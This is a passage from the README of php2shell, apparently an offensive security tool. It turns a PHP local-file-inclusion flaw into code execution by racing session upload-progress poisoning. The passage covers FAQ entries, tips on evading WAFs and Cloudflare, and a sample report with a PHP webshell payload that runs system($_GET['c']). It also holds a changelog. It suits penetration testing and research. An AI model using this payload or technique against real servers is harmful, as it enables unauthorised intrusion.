### Why does the SID keep changing between attempts?

`--retries N` preserves the working SID across retries so strict-mode
sessions keep working. When `--sid` is not supplied, the tool attempts
`obtain_server_sid()` first (a warmup POST to capture a `Set-Cookie`).
If strict mode is on, this is what keeps subsequent retries valid.

### Why is the default `-c` an `echo`?

Because `echo` is a language construct, not a function — it is not affected
by `disable_functions`. This makes the default probe a clean test of whether
the payload *executes* vs whether the shell *works*. If `echo` yields a
marker pair but `id` yields empty content, `disable_functions=system` is
likely — and the tool reports `disabled_function_suspected: true`.

### Can I use this without an LFI?

No. php2shell needs an LFI sink. It is not an LFI scanner.

### Does this work against PHP 8?

Yes, if `session.upload_progress.enabled = On` (the default). PHP 8 did not
remove or disable the feature. This is a design decision, not a bug.

### Does this work against Docker containers?

Yes, if the session save path is reachable. Common Docker paths are `/tmp`,
`/var/lib/php/sessions`, and `/var/www/sessions`. Try all three.

### Does this work through Cloudflare?

Usually not — Cloudflare blocks `/var/lib/php/...` paths in query strings.
Try URL-encoding the path or use `--lfi-workers 1 --lfi-interval 2000` to
avoid triggering rate limits.

### Can I run this on Windows?

Yes, php2shell runs on Windows natively. But you may need to install
OpenSSL or use the pre-built binary. See [Installation](#installation).

---

## Limitations

### `session.serialize_handler=php_serialize`

If the target uses `php_serialize` (non-default but common in modern
frameworks), the marker sits inside a serialized string and never executes.
**Not detected by php2shell.** You will see `NO_LFI` or `UNCONFIRMED` with
no explanation. Mitigation is heap grooming, which is out of scope.

### `session.use_strict_mode=1`

The server regenerates the SID because the one you supplied is unknown.
The tool detects strict mode via a warmup POST and reuses the server-issued
SID; if that fails, poisoning silently fails. Detected and warned; the fix
is to pass a real SID via `--sid`.

### `session.upload_progress.cleanup=Off`

This actually **helps** you — the poisoned file survives longer and the
race is trivially easy. The tool will hit on the first attempt.

### `disable_functions=system`

The marker pair can still appear (because `echo` is a language construct),
but `system()` returns nothing. The tool flags
`disabled_function_suspected: true` in the report. The verdict stays
`UNCONFIRMED` — a blocked call is not execution.

### SOCKS5 proxy

Only wired through `reqwest`, so LFI requests go through the proxy. The raw
race socket requires HTTP `CONNECT`. If you need SOCKS5 on the race path,
that's a `tokio-socks` integration not currently implemented.

### No auto-LFI discovery

By design. Discovering LFI sinks automatically makes the tool noisy, slow,
and error-prone. Supply `--lfi` yourself — you should already know the sink
from prior recon.

### No out-of-band collection

By design. Adding OOB channels (DNS, time-based, file-write) to the tool
would make it a scanner; you supply the channel, the tool reports what it
observed. See [Step 5](#step-5-investigate-an-unconfirmed-result).

### WAF / rate limiting

The LFI workers fire several requests per second per worker. Aggressive
WAFs will block the whole run. Tune `--lfi-workers 1 --lfi-interval 500` and
consider `--proxy` through a rotating pool.

---

## Comparison with other tools

| Tool | Technique | Concurrent LFI | Two-marker detection | Verdict taxonomy | JSON report |
|---|---|---|---|---|---|
| **php2shell** | session.upload_progress → LFI | ✅ | ✅ (capped at UNCONFIRMED) | ✅ 7 verdicts | ✅ |
| `php_filter_chain_generator` | filter chain → RCE | N/A (no race) | N/A | ❌ | ❌ |
| `lfimap` | many LFI techniques | ✅ | ❌ | ❌ | ⚠️ partial |
| `LFI Suite` | Python LFI scanner | ❌ | ❌ | ❌ | ❌ |
| `phpggc` | PHP object injection | N/A | N/A | N/A | N/A |

None of the above implements a marker-pair check or a verdict taxonomy that
distinguishes `NO_LFI` from `UNCONFIRMED` from `HTTP_ERROR` from
`RATE_LIMITED`. That's the niche.

---

## JSON report format

Every run can emit a structured report with `-o report.json`:

```json
{
  "target": "http://lab.local/",
  "verdict": "UNCONFIRMED",
  "attempts": 1,
  "php_signal_detected": true,
  "php_version": "8.2.18",
  "sid": "k3f9m2x8p1q7r4t6v0y5w2z8n3",
  "sid_charset": "5bit",
  "session_name": "PHPSESSID",
  "stall_ms": 3000,
  "command": "echo PHP_TRANSPORT_PROBE_OK",
  "param": "c",
  "payload": "<?php error_reporting(E_ALL);ini_set('display_errors','1');$m=\"PFMARK_a8k2n9z1\";echo $m;system($_GET['c']);echo $m;?>",
  "lfi_template": "http://lab.local/download.php?file=/var/lib/php/sessions/sess_%SID%&c=%CMD%",
  "race_http_status": 200,
  "retry_after": null,
  "race_note": "HTTP 200",
  "lfi_attempts": 47,
  "lfi_hits": 1,
  "marker_pair_detected": true,
  "marker_output": "PHP_TRANSPORT_PROBE_OK",
  "execution_confirmed": false,
  "disabled_function_suspected": false,
  "notes": [
    "marker pair present with content — reflection cannot be ruled out; verdict capped at UNCONFIRMED"
  ],
  "error": null,
  "timestamp": 1729700000
}
```

**The `payload` field is the exact string transmitted** — not a template.
This matters for reproducibility in reports.

**`php_signal_detected` semantics.** `true` = positive PHP signal observed.
`false` = checked, no positive signal (absence is *not* evidence that PHP
is absent). `null` = fingerprinting skipped or could not be attempted.

**`lfi_attempts` semantics.** This is a probe-attempt count, not a strict
wire-request count. An attempt that fails before dispatch still consumes
budget.

**`retry_after` semantics.** Reported from the race response, if any. Does
**not** influence the verdict. See [Verdicts](#verdicts).

**`execution_confirmed` semantics.** Always `false` in this build. Do not
promote `marker_pair_detected` to `true` here without adding an OOB
collection primitive.

---

## Changelog

### v0.4.0

- **Fix:** race socket failures no longer discard LFI hits
- **Fix:** `--retries` retries on transport errors
- **Fix:** `TCP_NODELAY` on every socket
- **Fix:** `1xx Continue` responses no longer misparsed
- **Fix:** duplicate `Cookie:` header when using `--header`
- **Fix:** `disable_functions=system` detected and flagged (`disabled_function_suspected`)
- **Fix:** marker extraction uses last adjacent pair
- **Fix:** fingerprint fallback is body-aware
- **Fix:** `--param` / `--progress-field` / `--session-name` CRLF validation
- **Fix:** IPv6 `Host` header is bracketed, default ports omitted
- **Fix:** chunked-body parsing (extensions, trailers, oversize claims)
- **Fix:** atomic attempt-cap reservation (`try_reserve`) — no over-fire on fast workers
- **Add:** `--session-name` for non-default PHP session names
- **Add:** `--sni` and `--no-verify-hostname` TLS flags
- **Add:** `--lfi-max-attempts` cap (renamed from `--lfi-max-requests`)
- **Add:** `Verdict::Unknown`, `Verdict::HttpError`, `Verdict::RateLimited`
- **Remove:** `Verdict::Rce`, `Verdict::Poisoned`, `Verdict::Crash`,
  `Verdict::Blocked`, `Verdict::Miss`, `Verdict::Error` — replaced by
  7-verdict model
- **Change:** `Verdict::Unconfirmed` replaces `Rce`/`Poisoned`; no CONFIRMED
  tier in this build
- **Change:** default `-c` is `echo PHP_TRANSPORT_PROBE_OK` (not
  `disable_functions`-affected)
- **Change:** default `-s` is `3000` ms
- **Change:** `php_detected` → `php_signal_detected` (`Option<bool>` with
  honest semantics)
- **Change:** `marker_found` → `marker_pair_detected`; `command_output` →
  `marker_output` (`UNVERIFIED`); `command_disabled` →
  `disabled_function_suspected`
- **Change:** `lfi_requests` → `lfi_attempts` (attempt cap, not wire cap)
- **Change:** `execution_confirmed` always `false` in this build
- **Change:** strict-mode detection via warmup POST; server SID preserved
  across retries
- **Change:** `--retries` stops early on any non-`UNKNOWN`/non-`HTTP_ERROR`
  verdict
- **Change:** `Retry-After` is reported (`retry_after`) but does not change
  the verdict
- **Change:** exit code 1 for `UNKNOWN` and `HTTP_ERROR` only
- **Change:** banner prints after `clap` parse; banner text updated to
  reflect UNCONFIRMED ceiling
- **Add:** worker panic logging, LFI status logging at `-v`
- **Add:** unit tests for `classify()` precedence, `Retry-After` handling,
  chunked decoding, atomic cap, 1xx parsing

### v0.3.0

- Initial public release

---

## References

- PHP manual, [`session.upload_progress`](https://www.php.net/manual/en/session.upload-progress.php)
- PHP manual, [`session.configuration`](https://www.php.net/manual/en/session.configuration.php)
- OWASP, [File Inclusion](https://owasp.org/www-community/attacks/File_Inclusion)
- PayloadsAllTheThings, [File Inclusion](https://github.com/swisskyrepo/PayloadsAllTheThings/tree/master/File%20Inclusion)
- PortSwigger, [File path traversal](https://portswigger.net/web-security/file-path-traversal)

---

## License

```
